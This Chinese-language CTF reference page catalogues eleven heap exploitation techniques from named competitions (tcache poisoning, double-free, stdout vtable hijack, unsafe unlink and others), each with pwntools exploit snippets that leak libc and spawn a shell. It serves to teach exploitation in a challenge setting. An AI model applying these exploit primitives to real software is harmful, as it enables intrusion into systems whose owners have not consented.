# 堆利用技术（第 2 部分）

[heap-techniques.md](heap-techniques.md) 的延续。第 2 部分汇总来自单独 writeup 的 CTF 专用 UAF、tcache 与自定义分配器变体。

## Table of Contents
- [UAF 中 vtable 指针编码为 shell 参数（BCTF 2017）](#uaf-中-vtable-指针编码为-shell-参数bctf-2017)
- [未初始化 chunk 残留指针泄漏（picoCTF 2018）](#未初始化-chunk-残留指针泄漏picoctf-2018)
- [tcache strcpy 空字节溢出 + 向后合并（HITCON 2018）](#tcache-strcpy-空字节溢出--向后合并hitcon-2018)
- [相邻结构体函数指针溢出实现 libc 泄漏 + GOT 覆盖（RITSEC 2018）](#相邻结构体函数指针溢出实现-libc-泄漏--got-覆盖ritsec-2018)
- [隐藏菜单项 1337 实现 tcache 投毒（FireShell 2019）](#隐藏菜单项-1337-实现-tcache-投毒fireshell-2019)
- [tcache double-free + 伪造 _IO_FILE vtable 劫持 stdout（BCTF 2018）](#tcache-double-free--伪造-_io_file-vtable-劫持-stdoutbctf-2018)
- [tcache 到 fastbin 的提升型跨 bin 攻击（BCTF 2018）](#tcache-到-fastbin-的提升型跨-bin-攻击bctf-2018)
- [6 位下标越界 + written_bytes 累加器递增函数指针（Codegate 2019）](#6-位下标越界--written_bytes-累加器递增函数指针codegate-2019)
- [翻转 IS_MMAPED 位在 calloc chunk 上实现 unsorted bin 泄漏（0CTF 2017）](#翻转-is_mmaped-位在-calloc-chunk-上实现-unsorted-bin-泄漏0ctf-2017)
- [仅改 LSB 堆指针覆盖 + 文件名正则约束下的 fastbin（BSidesSF 2019）](#仅改-lsb-堆指针覆盖--文件名正则约束下的-fastbinbsidessf-2019)
- [自定义分配器 unsafe unlink 打 GOT（DEF CON Qualifier 2014）](#自定义分配器-unsafe-unlink-打-gotdef-con-qualifier-2014)

FILE 结构（_IO_FILE）利用见 [heap-fsop.md](heap-fsop.md)。基础 house 技术（Apple 2、Einherjar、Orange、Spirit、Lore、Force）、unsafe unlink、tcache stashing 与 musl 见 [heap-techniques.md](heap-techniques.md)。

---

<a id="uaf-vtable-pointer-encoding-shell-argument-bctf-2017"></a>
## UAF 中 vtable 指针编码为 shell 参数（BCTF 2017）

**模式：** UAF 之后用堆喷把内存填满偏移 3 字节处的 `system()` 地址。当 vtable 指针地址形如 `0x??006873` 时，对象起始处就编码出 ASCII `"sh\x00"`，于是通过 vtable 调用 `system()` 实际执行的是 `system("sh")`。

```python
from pwn import *

# Heap spray: fill 16MB with system() address at offset +3
# Each spray chunk: 3 bytes padding + 8 bytes system_addr, repeated
spray_unit = b"\x00" * 3 + p64(system_addr)
spray_data = spray_unit * (0x1000000 // len(spray_unit))

# Trigger heap spray via application interface
for i in range(spray_count):
    alloc(spray_data[:chunk_size])

# UAF object at address 0xXX006873
# Bytes at object start: 73 68 00 XX = "sh\x00..."
# When vtable call dispatches: system(this) → system("sh")

# Trigger: free the target object, then invoke its virtual method
free(target_obj)
trigger_vtable_call(target_obj)  # calls system("sh")
```

**关键洞察：** vtable 指针值本身充当 `system()` 的字符串参数。通过安排堆喷，让对象落在低字节含 `0x6873`（ASCII "sh"）的地址上，对象地址就同时是一条合法的 shell 命令字符串。这样就不需要额外的受控字符串 —— 指针本身就是参数。

**识别时机：** 对带虚函数的 C++ 对象存在 UAF，且你能控制堆布局但无法控制对象 `this` 指针处的确切内容。如果 `system()` 会以 `this` 为首个参数被调用（vtable 分发中很常见），那么对象地址只要能解码成合法命令字符串就够了。

**参考：** BCTF 2017

FILE 结构（_IO_FILE）利用见 [heap-fsop.md](heap-fsop.md)：fastbin stdout vtable 劫持、`_IO_buf_base` 空字节覆盖、glibc 2.24+ vtable 校验绕过、针对 stdin FILE 字段的 unsorted-bin 攻击，以及相关的 UAF/引用计数缺陷。

---

<a id="uninitialized-chunk-residue-pointer-leak-picoctf-2018"></a>
## 未初始化 chunk 残留指针泄漏（picoCTF 2018）

**模式：** 通讯录程序在堆上分配结构体 `{name, bio}`，但只写入 `name`，`bio` 保持未初始化。经历一次"删除再创建"后，新分配复用了仍残留上一联系人陈旧指针的 chunk。程序的 `print_contact()` 会解引用 `bio`，于是分配器残留物变成了可控的堆/libc 读取。

```c
struct contact { char *name; char *bio; };    // bio never zeroed

void create() {
    struct contact *c = malloc(sizeof *c);
    c->name = malloc(NAME_SZ);
    read_line(c->name, NAME_SZ);
    // bio left uninitialized!
}

void print(struct contact *c) { puts(c->bio); }   // leaks stale pointer target
```

```python
from pwn import *
io = process("./contacts")

# 1. Prime the heap: create a contact whose name chunk will later be reused
#    as the struct for the next contact.
io.sendline("create");  io.sendline("A" * 0x18)
io.sendline("delete 0")

# 2. Create a new contact — it grabs the previously freed chunk. The old
#    name bytes now live in the struct's `bio` field.
io.sendline("create");  io.sendline("B" * 0x10)

# 3. Print → leaks the residue as if it were a bio string.
io.sendline("print 0")
leak = u64(io.recvline().ljust(8, b"\x00"))
log.success(f"heap leak: {leak:#x}")
```

**关键洞察：** 未初始化字段相当于反向的 write-what-where —— 攻击者不能决定字段里*装什么*，但可以通过*摆放* chunk 让有用的字节落进去。盯住那些 (a) 之后会被读取却从未被写入、且 (b) 处于 chunk 复用路径上的结构体字段。常见元凶：手写的 `malloc` + `read_line` 组合、构造时跳过初始化的 C++ 类成员，以及清零后又只写一部分的缓存。

**参考：** picoCTF 2018 — Contacts，writeup 11585

---

<a id="tcache-strcpy-null-byte-overflow--backward-consolidation-hitcon-2018"></a>
## tcache strcpy 空字节溢出 + 向后合并（HITCON 2018）

**模式：** `strcpy(dst, user_name)` 追加的结尾 NUL 恰好落在分配 chunk 之后一字节，清掉了下一个 chunk size 字段里的 `PREV_INUSE`。配合伪造的 `prev_size`，`free()` 会跨一个仍驻留在 tcache 的 chunk 触发向后合并，产生两块重叠的堆区域。切分出剩余 chunk 后，main_arena 指针得以留在某块重叠分配的 `fd`/`bk` 中，从而在 tcache 时代仍能拿到 unsorted-bin 式的 libc 泄漏。

```c
// Allocation pattern (glibc 2.27 tcache)
char *a = malloc(0xF8);            // victim 1
char *b = malloc(0x18);            // small header chunk with PREV_INUSE
strcpy(a, payload);                // 0xF8 bytes + '\0' overflows into b->size
```

```python
from pwn import *

io = process("./children_tcache")
libc = ELF("./libc-2.27.so")

# 1. Zero the 0xda memset residue with repeated smaller allocations.
for size in (0x70, 0x60, 0x50, 0x40):
    io.sendline("add"); io.sendline(str(size)); io.sendline(b"\x00" * size)

# 2. Set up two adjacent chunks:
io.sendline("add"); io.sendline("0xF8"); io.sendline(b"A" * 0xF8)     # victim 1
io.sendline("add"); io.sendline("0x18"); io.sendline(b"B" * 0x18)     # header

# 3. Free victim 1 into the smallbin (needs a > 0x408 sibling to bypass tcache).
io.sendline("add"); io.sendline("0x420"); io.sendline(b"X" * 0x420)
io.sendline("del 0")                         # smallbin → keeps libc fd/bk

# 4. Overflow via strcpy: clears PREV_INUSE, forges prev_size → backward consolidate
overflow = b"A" * 0xF0 + p64(0x100)           # fake prev_size
io.sendline("edit 1"); io.sendline(overflow)
io.sendline("del 1")                         # consolidate: now we overlap

# 5. Re-allocate the coalesced region and read the libc pointer that still
#    lives in the old fd/bk location.
io.sendline("add"); io.sendline("0x110"); io.sendline(b"P" * 0x10)
io.sendline("show 0")
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - (libc.symbols["main_arena"] + 0x60)
log.success(f"libc base {libc.address:#x}")
```

**关键洞察：** tcache 绕过了 2.27 之前的大多数合并技巧，但 `strcpy` 空字节溢出依然有效，因为作用于*下一个 chunk 的头部*，而非当前 chunk 的 in-use 标志。再配合仔细清空 glibc 2.26+ 的 memset 残留（free 时写入的 `0xda` 图案），即使在 tcache 世界里也能复用经典的 off-by-one-null 技术。关键尺寸：足够大以跳过 tcache（被释放的 chunk 要 >0x408），又足够小以紧邻溢出目标。

**参考：** HITCON CTF 2018 — Children Tcache，writeup 11929

---

<a id="adjacent-struct-fn-pointer-overflow-for-libc-leak--got-overwrite-ritsec-2018"></a>
## 相邻结构体函数指针溢出实现 libc 泄漏 + GOT 覆盖（RITSEC 2018）

**模式：** 用 `cgo` 编译的 Go 二进制把 name 缓冲区紧挨着一个首字段为函数指针（C 风格 vtable）的结构体放置。溢出 name 字段即可破坏下一个结构体的函数指针。第一次覆盖 → 把调用重定向到 `puts(got['free'])` 泄漏 libc。第二次覆盖 → 让 free 的 GOT 表项指向 `system`，然后 free 一块内容为 `"/bin/sh"` 的 chunk。

```python
# 1. Leak libc
payload = b'A'*name_size + p64(puts_plt) + p64(pop_rdi_ret) + p64(free_got)
io.send(payload); io.recvuntil(b'name: '); libc = u64(io.recv(6).ljust(8, b'\x00'))

# 2. Overwrite free@GOT with system
libc_base = libc - libc_syms['puts']
io.send(b'A'*name_size + p64(libc_base + libc_syms['system']))

# 3. Free a chunk whose contents are "/bin/sh\x00"
io.sendline('/bin/sh')
io.sendline('delete 0')
```

**关键洞察：** cgo 二进制里常有 C 风格结构体紧邻 Go 分配缓冲区，因此经典 C 堆技术对 Go 服务端同样奏效。反编译中留意 `GoString` + `char*` + 函数指针的模式；布局通常是确定性的。

**参考：** RITSEC CTF 2018 — Yet Another HR Management Framework，writeups 12283、12287

---

<a id="hidden-menu-option-1337-for-tcache-poisoning-fireshell-2019"></a>
## 隐藏菜单项 1337 实现 tcache 投毒（FireShell 2019）

**模式：** 可见菜单把分配次数限制在几块内，但反汇编发现一个未公开的选项（`1337`），它调用 `malloc` 和 `edit` 却不更新计数器 —— 等于给了无限次分配。配合普通的 tcache UAF，就能灌满 tcache、把某表项的 `fd` 覆写为 BSS 目标，再 `malloc` 出任意地址。

```python
def hidden(sz, data):
    p.sendlineafter(b'>', b'1337')
    p.sendlineafter(b'size:', str(sz).encode())
    p.sendafter(b'data:', data)

free(0); free(1)
hidden(0x20, p64(bss_target))   # tcache fd → bss_target
_ = malloc(0x20)                # first chunk back
shell = malloc(0x20)            # returns bss_target
```

**关键洞察：** 在认定题目"有次数限制"之前，务必把菜单解析逻辑完整翻一遍，找未公开分支。`1337`、`9999`、`0xdead` 这类数字选项是作者为调试自己题目而留下的经典后门。

**参考：** FireShell CTF 2019 — babyheap，writeup 12962

---

<a id="tcache-double-free--fake-_io_file-vtable-stdout-hijack-bctf-2018"></a>
## tcache double-free + 伪造 _IO_FILE vtable 劫持 stdout（BCTF 2018）

**模式：** 分配次数预算很小，fastbin + tcache 均可用。把一块 fastbin chunk double-free 进 tcache，malloc 拿到指向 `_IO_2_1_stdout_` 的 tcache 表项，再把 stdout 的 `vtable` 指针改成伪造跳转表，其中 `_IO_file_overflow` → `system`。下次 printf 调用即执行 `system("/bin/sh")`。

```python
# 1. Free A twice (bypasses fastbin double-free via tcache)
free(A); free(A)
# 2. Malloc returns A; write stdout addr as next fd
edit(A, p64(stdout))
# 3. Next malloc returns stdout
malloc()
malloc()  # returns &stdout
edit(stdout, fake_file_struct(vtable=fake_vt))
```

伪造 vtable 表项：把 `_IO_file_overflow` 对应的槽位设为 `system`。

**关键洞察：** tcache 跳过了 fastbin 的安全检查，因此直接 double-free 进 tcache 即可，无需常见的大小字段把戏。得到的 write-where 原语可以轻易触及 libc 中的 `_IO_2_1_stdout_`。

**参考：** BCTF 2018 — easiest，writeup 12489

---

<a id="tcache-to-fastbin-promotion-cross-bin-attack-bctf-2018"></a>
## tcache 到 fastbin 的提升型跨 bin 攻击（BCTF 2018）

**模式：** 只有约 2 次分配机会 —— 太少，做不了传统的 tcache dup。改为先填满 tcache，再溢出进 fastbin，构造一个头部指向已知结构体内部的 chunk。当后续一次 free 触发 fastbin 分配回填到 tcache（提升）时，malloc 就会返回那个头部地址。

```python
for _ in range(7): free(tcache_chunks[_])   # fill tcache bin
free(fastbin_chunk)                         # goes to fastbin
edit(fastbin_chunk, p64(target_hdr))        # poison fastbin fd
# Drain tcache so next free of fastbin_chunk promotes:
for _ in range(7): malloc(size)
free(fastbin_chunk)                         # now lands in tcache
malloc(size)                                 # returns tcache head = target_hdr
```

**关键洞察：** tcache 与 fastbin 在部分边界上共享大小类；起始于其一的 chunk 常常会迁移到另一处。分配预算紧张时，可以把这种提升当作额外的重分配步骤来用。

**参考：** BCTF 2018 — three/houseofatum，writeups 12476、12477

---

<a id="6-bit-index-oob--written_bytes-accumulator-for-fn-pointer-increment-codegate-2019"></a>
## 6 位下标越界 + written_bytes 累加器递增函数指针（Codegate 2019）

**模式（archiver）：** C++ 压缩器维护 48 项 QWORD 缓存（`cached_qwords[48]`），但缓存读写操作码接受 6 位下标（0-63），因此可越界访问周围对象成员（`buf`、`buf_size`、`buf_offset_Q`、`written_bytes`、`print_uncomp_fsz`）。所有操作按 QWORD 对齐，无法直接切开放置函数指针；改为滥用未被使用的 `written_bytes` 计数器作为可编程偏移累加器，把 `print_uncomp_fsz` 变成 `cat_flag()`。

```python
# OOB write primitives (a2 in [0, 0x3f]):
#   cache_qword(a2, k)            -> cached_qwords[a2] = buf[buf_off_Q - k]
#   save_cached_qword_to_comp(a2) -> buf[++off] = cached_qwords[a2]; written_bytes += 8

# 1. Preallocate buf so it is not realloc'd later (avoids data loss).
# 2. Save print_uncomp_fsz into buf via OOB save_cached_qword_to_comp(0x34).
# 3. Move it back into written_bytes via OOB cache_qword(0x33, 1).
# 4. Emit 0x38 cached QWORDs -> written_bytes += 0x38*8 == 0x1c0 (offset to cat_flag).
# 5. Save the now-incremented written_bytes into buf, then OOB write it back
#    on top of print_uncomp_fsz. Trigger an error path so main() calls it.
payload += save_cached_qword_to_comp(0x34)       # fn ptr -> buf
payload += cache_qword(0x33, 1)                  # buf -> written_bytes
payload += save_cached_qword_to_comp(0) * 0x38   # written_bytes += 0x1c0
payload += save_cached_qword_to_comp(0x33)       # written_bytes -> buf
payload += cache_qword(0x34, 1)                  # buf -> print_uncomp_fsz
```

**关键洞察：** 当越界写只能按 QWORD 对齐、而目标函数与已有指针相差 `N*0x10` 字节时，去找同一结构体里每次按固定步长递增的进程内计数器。把这个计数器当作算术中间变量，就能把对齐写原语变成字节精确的指针递增，从而在完全不泄漏代码地址的情况下绕过 PIE。

**参考：** Codegate CTF 2019 Preliminary — archiver，writeup 13014

---

<a id="is_mmaped-bit-flip-for-unsorted-bin-leak-on-callocd-chunk-0ctf-2017"></a>
## 翻转 IS_MMAPED 位在 calloc chunk 上实现 unsorted bin 泄漏（0CTF 2017）

**模式（BabyHeap2017）：** 全防护二进制（Full RELRO、canary、NX、PIE、ASLR）中的堆溢出。`calloc` 通常会清零新分配的 chunk，堵住了经典的 unsorted-bin 泄漏（依赖 fd/bk 覆盖可复用数据）。但当 chunk 的 `IS_MMAPED` 标志被置位时，glibc 会跳过清零。溢出前一个 chunk 把已释放的 unsorted-bin chunk 的 `IS_MMAPED` 翻起来，再用 `calloc` 重新分配它 —— fd/bk 中的 arena 指针得以保留，从而泄漏 libc。

```python
# Layout: A (0x80) | B (0x80 freed -> unsorted) | C (victim with overflow)
# Overflow from A into B's chunk header: set size |= IS_MMAPED (bit 1 of size field)
edit(A, b'A'*0x80 + p64(0) + p64(0x91 | 0x2))    # prev_size=0, size=0x91|IS_MMAPED

# calloc-reallocate B: because IS_MMAPED is set, calloc does NOT memset it.
# B's fd/bk still point to main_arena + 0x58 -> libc leak via view(B).
malloc(0x80)                   # returns B with libc pointer intact in first 16 bytes
libc_base = leak - main_arena_offset

# Follow-up: fastbin dup -> __malloc_hook -> one_gadget
```

**关键洞察：** `calloc` 是否清零取决于分配器走的路径。通过堆溢出设置 `IS_MMAPED`，可让 `calloc` 误以为复用 chunk 是新 mmap 的而跳过 `memset`，从而保留此前写入 fd/bk 的 arena 指针。一次 2 位元数据覆写就击破了"calloc 阻断泄漏"的假设。

**参考：** 0CTF 2017 Quals — babyheap，writeup 13262

---

<a id="filename-regex-constrained-fastbin-via-lsb-only-heap-pointer-overwrite-bsidessf-2019"></a>
## 仅改 LSB 堆指针覆盖 + 文件名正则约束下的 fastbin（BSidesSF 2019）

**模式（straw_clutcher）：** 文件服务器的堆上有个 `RENAME` 处理器，对 `old_name` 做了两次长度检查而不是分别检查 `old_name`/`new_name`，因此产生有界堆溢出，可写入相邻的 `file_t`（`filename[0x20]`、`file_size`、`data`、`free_option`、`prev_file`）。所有文件名必须匹配 `[A-Za-z0-9]+.[A-Za-z0-9]{3}`，这排除了完整的 fastbin-fd 覆写 —— 但正则只看到 `filename` 中**第一个以 NUL 结尾的字符串**，保留 NUL 之后的字节不受约束。只改 `prev_file` 的 LSB 让它重新指向 `file->data`（攻击者可控），伪造出一个假 chunk，从而可做 double-free + fastbin 攻击打 `__malloc_hook`。

```python
# 1. Leak libc/heap by overwriting file_size to huge value, then RETR dumps the heap.
# 2. Create file whose data bytes satisfy regex as a fake file_t chunk header.
pc.sendline('PUT EEE.EXE {}'.format(0x48))
pc.send(p64(0x4848482e484848) + p64(0)*4       # fake filename "HHH.HHH"
        + p64(0x68)                             # fake file_size
        + p64(heap + 0x250) + p64(0)            # fake data
        + p64(heap + 0x190))                    # fake prev_file
# 3. Produce two 0x70 freed chunks, then overwrite LSB of file->prev_file via rename:
pc.sendline('RENAME EEE.EXE ' + 'E'*7*8 + 'EEEEE.EXP')
# Only LSB of prev_file changes -> upper bytes preserved, LSB lands inside data.
# 4. DELE the forged entry -> double-free on 0x70 tcache/fastbin.
# 5. Classic fastbin poison onto __malloc_hook - 0x23, then trigger with PUT.
```

**关键洞察：** 当溢出可按字节寻址、但必须通过字符类过滤时，只改堆元数据指针的 LSB。堆地址各 chunk 共享高位字节，单个可控 LSB 就能把指针迁移到同一个 256 字节窗口内的别处 —— 足以落到你已经控制的缓冲区里，从而绕过那些会拒绝完整 8 字节覆写的正则/字符集约束。

**参考：** BSidesSF 2019 — straw_clutcher，writeup 13763

---

<a id="custom-allocator-unsafe-unlink-to-got-def-con-qualifier-2014"></a>
## 自定义分配器 unsafe unlink 打 GOT（DEF CON Qualifier 2014）

**模式：** 非 glibc 分配器的 `free` 实现很朴素 —— 直接 `mem[fd] = bk`（并对称地 `mem[bk+4] = fd`），没有任何 safe-unlink 一致性检查。从第 10 块 chunk（0x104 字节）溢出可破坏第 11 块的 `fd`/`bk`，这样当第 9 块被释放、第 11 块在合并时成为其"邻居"，unlink 就会把 `printf@GOT` 写成 shellcode 跳转目标。

```python
from pwn import *
context(arch='i386', os='linux')

printf_got = 0x804c004
array_10_addr = 0x...   # leaked from banner output "loc=0xADDR"

payload  = p32(printf_got - 8)       # fake fd -> target = printf GOT (minus 8 for offset)
payload += p32(array_10_addr + 8)    # fake bk -> value = addr of shellcode jump
payload += b"\xeb\x08" + b"A"*8 + asm(shellcraft.sh())  # jmp +8; pad; shellcode
payload += b"A" * (260 - len(payload))
payload += p32(0)                    # next chunk's size field (prev_in_use = 0)
```

**关键洞察：** 自定义分配器几乎从不实现 glibc 在 2004 年引入的 `fd->bk == chunk && bk->fd == chunk` safe-unlink 检查。经典的 `unlink(chunk)` 式 write-what-where 可以原样套用 —— 瞄准很快会被调用的 GOT 表项（printf、free、puts），并在 8 字节写槽上叠加一条短的 `jmp +8` 跳进 shellcode。同时要保证哨兵 chunk 伪造的 `size` 字段合法，使分配器仍会执行合并而不是中止。

**参考：** DEF CON CTF Qualifier 2014 — heap，writeup 13953
